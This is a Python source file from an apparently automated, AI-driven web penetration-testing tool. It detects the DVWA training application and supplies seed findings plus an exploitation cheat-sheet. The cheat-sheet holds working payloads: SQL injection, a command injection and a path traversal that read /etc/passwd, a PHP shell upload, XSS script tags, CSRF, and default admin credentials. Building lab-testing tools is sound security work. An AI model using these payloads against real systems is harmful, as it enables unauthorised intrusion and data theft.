import os

from ..models.schemas import DiscoveryFinding
from ..utils.logger import get_logger

logger = get_logger("profiles")


class TargetProfile:
    """A known-application accelerator. Activates only when the target matches.

    A profile never replaces discovery — it adds seed injection points and an
    exploitation cheat-sheet on top of whatever the crawl found. The pipeline is
    fully functional with no profile matched; profiles only speed up known apps.
    """

    name = "generic"

    def matches(self, base_url, web_analysis, recon) -> bool:
        return False

    def cheat_sheet(self) -> str:
        return ""

    def seed_findings(self, base_url) -> list:
        return []


def _haystack(base_url, web_analysis, recon) -> str:
    parts = [base_url or ""]
    if web_analysis:
        parts.append(web_analysis.title or "")
        parts.append(web_analysis.page_text or "")
        parts.append(" ".join(web_analysis.links or []))
        parts.append(" ".join(str(v) for v in (web_analysis.headers or {}).values()))
    if recon:
        parts.append(getattr(recon, "raw_output", "") or "")
    return " ".join(parts).lower()


class DVWAProfile(TargetProfile):
    name = "dvwa"

    def matches(self, base_url, web_analysis, recon) -> bool:
        hay = _haystack(base_url, web_analysis, recon)
        if "dvwa" in hay or "damn vulnerable web" in hay:
            return True
        return "/vulnerabilities/" in hay and "security.php" in hay

    def seed_findings(self, base_url) -> list:
        base = (base_url or "").rstrip("/")
        v = f"{base}/vulnerabilities"
        spec = [
            ("sqli", f"{v}/sqli/", "id"),
            ("sqli", f"{v}/sqli_blind/", "id"),
            ("command_injection", f"{v}/exec/", "ip"),
            ("lfi", f"{v}/fi/", "page"),
            ("file_upload", f"{v}/upload/", ""),
            ("xss", f"{v}/xss_r/", "name"),
            ("xss", f"{v}/xss_s/", "mtxMessage"),
            ("xss", f"{v}/xss_d/?default=English", "default"),
            ("csrf", f"{v}/csrf/", ""),
            ("brute_force", f"{v}/brute/", "username"),
            ("open_redirect", f"{v}/open_redirect/?redirect=info.php", "redirect"),
            ("misconfiguration", f"{v}/weak_id/", ""),
        ]
        return [
            DiscoveryFinding(
                vuln_type=vt,
                location=url,
                parameter=param,
                evidence=f"DVWA profile: known {vt} module at {url}.",
                priority="high",
            )
            for vt, url, param in spec
        ]

    def cheat_sheet(self) -> str:
        return (
            "DVWA LOW ENDPOINT CHEAT-SHEET (target detected as DVWA — use the EXACT "
            "field names + submit button):\n"
            "- SQLi: GET /vulnerabilities/sqli/  params: id=1' OR '1'='1 , Submit=Submit\n"
            "  Success: response contains \"First name: ... Surname: ...\".\n"
            "- SQLi blind: GET /vulnerabilities/sqli_blind/  param: id=1' OR '1'='1  (or "
            "time-based id=1' AND SLEEP(3)#). SEPARATE finding from /sqli/.\n"
            "- Command injection: POST /vulnerabilities/exec/  body: ip=127.0.0.1; cat "
            "/etc/passwd , Submit=Submit. Success: \"root:x:0:0:\".\n"
            "- LFI / File inclusion: GET /vulnerabilities/fi/  param: "
            "page=../../../../../../../../etc/passwd (param is 'page', NOT 'include'; "
            "/csp/ is NOT the LFI page). Success: \"root:x:0:0:\".\n"
            "- File upload: POST multipart /vulnerabilities/upload/  fields: "
            "uploaded=@shell.php AND Upload=Upload. Success: \"succesfully uploaded\" "
            "(one 's'). File lands at /hackable/uploads/shell.php.\n"
            "- Brute force: GET /vulnerabilities/brute/  params: username=admin , "
            "password=password , Login=Login. Success: \"Welcome to the password "
            "protected area\".\n"
            "- Reflected XSS: GET /vulnerabilities/xss_r/  param: "
            "name=<script>alert(1)</script> (payload reflected unescaped).\n"
            "- Stored XSS: POST /vulnerabilities/xss_s/  fields: txtName=x , "
            "mtxMessage=<script>alert(1)</script> , btnSign=Sign Guestbook.\n"
            "- DOM XSS: GET /vulnerabilities/xss_d/  param: "
            "default=<script>alert(1)</script>.\n"
            "- XSS has THREE separate pages (xss_r reflected, xss_s stored, xss_d DOM). "
            "Test ALL THREE and report EACH as its OWN STATUS block (different URL).\n"
            "- CSRF: GET /vulnerabilities/csrf/  fields: password_new , password_conf , "
            "Change=Change. No token at low. Confirm by changing the password via a "
            "forged request / auto-submitting form.\n"
            "- Open redirect: GET /vulnerabilities/open_redirect/  param: "
            "redirect=http://example.com. Confirmed if the response redirects off-site.\n"
            "- Weak session IDs: GET /vulnerabilities/weak_id/ — confirmed if the "
            "dvwaSession cookie is sequential/predictable across requests.\n"
            "- DVWA default credentials: admin/password."
        )


_PROFILES = [DVWAProfile()]


def detect_profile(base_url, web_analysis=None, recon=None):
    forced = os.getenv("BINGO_TARGET_PROFILE", "").strip().lower()
    if forced:
        if forced in ("none", "off", "general", "generic"):
            logger.info("Profiles disabled via BINGO_TARGET_PROFILE=%s (general path only)", forced)
            return None
        for profile in _PROFILES:
            if profile.name == forced:
                logger.info("Target profile forced via BINGO_TARGET_PROFILE=%s", forced)
                return profile
        logger.warning("BINGO_TARGET_PROFILE=%s unknown; falling back to auto-detect", forced)

    for profile in _PROFILES:
        try:
            if profile.matches(base_url, web_analysis, recon):
                logger.info("Target matched profile: %s", profile.name)
                return profile
        except Exception as e:
            logger.warning("Profile %s match check failed: %s", profile.name, e)
    return None
